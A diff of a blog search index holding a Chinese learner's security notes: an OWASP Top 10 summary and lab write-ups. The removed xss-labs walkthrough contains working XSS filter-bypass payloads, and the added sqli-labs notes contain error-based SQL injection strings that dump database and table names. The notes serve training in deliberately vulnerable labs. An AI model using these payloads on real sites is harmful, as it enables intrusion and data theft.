@@ -1,6 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title></title>
+    <url>/2023/05/22/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
+<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
+<p>电商-业务逻辑突出</p>
+<p>论坛-xss逻辑突出</p>
+<p>博客-漏洞较少</p>
+<p>第三方-功能决定</p>
+<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
+<p>CMS识别-即是否套用了模板</p>
+<p>开源-找漏洞和审计</p>
+<p>内部-渗透测试</p>
+<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
+]]></content>
+  </entry>
+  <entry>
     <title>NATAS</title>
     <url>/2023/05/14/NATAS/</url>
     <content><![CDATA[<h2 id="NATAS-0"><a href="#NATAS-0" class="headerlink" title="NATAS 0"></a>NATAS 0</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141731305.png" alt="image-20230516141731305"></p>
@@ -191,162 +207,6 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title>xss-labs</title>
-    <url>/2023/05/17/xss-labs/</url>
-    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
-<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
-<p>构造input闭合</p>
-<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
-<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
-<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
-<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
-<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
-<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
-<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
-<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
-<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
-<p>点击链接跳转即可</p>
-<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
-<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
-<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
-<p>但没有大写过滤</p>
-<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
-<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
-<p>双写绕过</p>
-<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
-<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
-<p>scr字符后面会放_符号，且大写会被转化为小写</p>
-<p>引号也实体化了</p>
-<p>将代码进行unicode编码即可</p>
-<p>如<code>javascript:alert(1)</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
-<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
-<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
-<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
-<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
-<p>部分源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>url被符号实体化了。</p>
-<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
-<p>给input加一个onclick事件</p>
-<p>如<code>onclick=alert(1)</code></p>
-<p>记得去掉type的hide属性</p>
-<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
-<p>但是应该不对，怎么会有同一种解法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>第四行明显是说Reffer</p>
-<p>bp时</p>
-<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
-<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>bp时，很明显是</p>
-<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这应该提示了cookie</p>
-<p>bp试试</p>
-<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
-<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
-<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
-<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
-<p>f12出现这个：</p>
-<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>知识点：ng-include</p>
-<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
-<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
-<p>2、包含的内容将作为指定元素的子节点。</p>
-<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
-<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
-<p>值得注意的是：</p>
-<p>ng-include,如果单纯指定地址，必须要加引号</p>
-<p>ng-include,加载外部html，script标签中的内容不执行</p>
-<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
-<p>把其他存在xss漏洞的文件包含进来。</p>
-<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
-<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
-<p>试试img，并且替换个空格</p>
-<p>%0a试试。</p>
-<p><code>keyword=</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
-<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
-<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
-<p>onmouseover前加个空格</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
-<p>level18同理。</p>
-<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
-]]></content>
-      <categories>
-        <category>xss</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>owasp top10漏洞</title>
-    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
-<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
-<p> 防御方法：使用参数化查询、输入校验和白名单、最小化权限等。</p>
-<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
-<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
-<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
-<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
-<p>攻击方式：网络嗅探、数据泄露等。 </p>
-<p>防御方法：加密、数据保护、强密码策略等。</p>
-<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
-<p> 攻击方式：XXE攻击等。</p>
-<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
-<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
-<p>攻击方式：直接访问、暴力破解等。 </p>
-<p>防御方法：访问控制、安全编码、安全测试等。</p>
-<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
-<p>攻击方式：目录遍历、错误页面泄露等。 </p>
-<p>防御方法：安全配置、代码审计、最小化权限等。</p>
-<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
-<p>攻击方式：反射型XSS、存储型XSS等。</p>
-<p> 防御方法：输入校验、输出编码、HTTPOnly标记等。</p>
-<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
-<p> 攻击方式：注入恶意对象等。</p>
-<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
-<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
-<p>攻击方式：利用已知漏洞等。</p>
-<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
-<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
-<p> 攻击方式：暴力破解、DDoS攻击等。</p>
-<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
-]]></content>
-      <categories>
-        <category>top10 漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>xss</tag>
-        <tag>RCE</tag>
-        <tag>upload</tag>
-        <tag>xxe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bandit(level 0-19)</title>
     <url>/2023/05/14/bandit-level-0-19/</url>
     <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
@@ -529,17 +389,605 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>owasp top10漏洞</title>
+    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
+<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
+<p> 防御方法：使用参数化查询、输入校验和白名单、最小化权限等。</p>
+<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
+<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
+<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
+<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
+<p>攻击方式：网络嗅探、数据泄露等。 </p>
+<p>防御方法：加密、数据保护、强密码策略等。</p>
+<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
+<p> 攻击方式：XXE攻击等。</p>
+<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
+<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
+<p>攻击方式：直接访问、暴力破解等。 </p>
+<p>防御方法：访问控制、安全编码、安全测试等。</p>
+<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
+<p>攻击方式：目录遍历、错误页面泄露等。 </p>
+<p>防御方法：安全配置、代码审计、最小化权限等。</p>
+<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
+<p>攻击方式：反射型XSS、存储型XSS等。</p>
+<p> 防御方法：输入校验、输出编码、HTTPOnly标记等。</p>
+<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
+<p> 攻击方式：注入恶意对象等。</p>
+<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
+<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
+<p>攻击方式：利用已知漏洞等。</p>
+<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
+<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
+<p> 攻击方式：暴力破解、DDoS攻击等。</p>
+<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
+]]></content>
+      <categories>
+        <category>top10 漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>xss</tag>
+        <tag>RCE</tag>
+        <tag>upload</tag>
+        <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/05/23/bp%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>抓包；爆破；repeat尝试</p>
+<p>注意里面的空格用+或%20代替</p>
+<blockquote>
+<p>POST &#x2F;sqli&#x2F;9.php?a&#x3D;1236 HTTP&#x2F;1.1</p>
+</blockquote>
+<p>否则被认为是如HTTP&#x2F;1.1这种独立的数值</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqli</title>
+    <url>/2023/05/20/sqli-labs/</url>
+    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
+<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
+<p>发现提示</p>
+<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
+<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
+<p><img src="/../../../Typora/img111/image-20230523154632755.png" alt="image-20230523154632755"></p>
+<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
+<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
+<blockquote>
+<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
+</blockquote>
+<p>可以判定是有单引号的闭合</p>
+<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
+<blockquote>
+<p>the right syntax to use near ‘’ at line 1</p>
+</blockquote>
+<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
+<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
+<blockquote>
+<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
+</blockquote>
+<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
+<blockquote>
+<p>XPATH syntax error: ‘^security’</p>
+</blockquote>
+<p>and替换成or也是可以的</p>
+<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
+<blockquote>
+<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
+</blockquote>
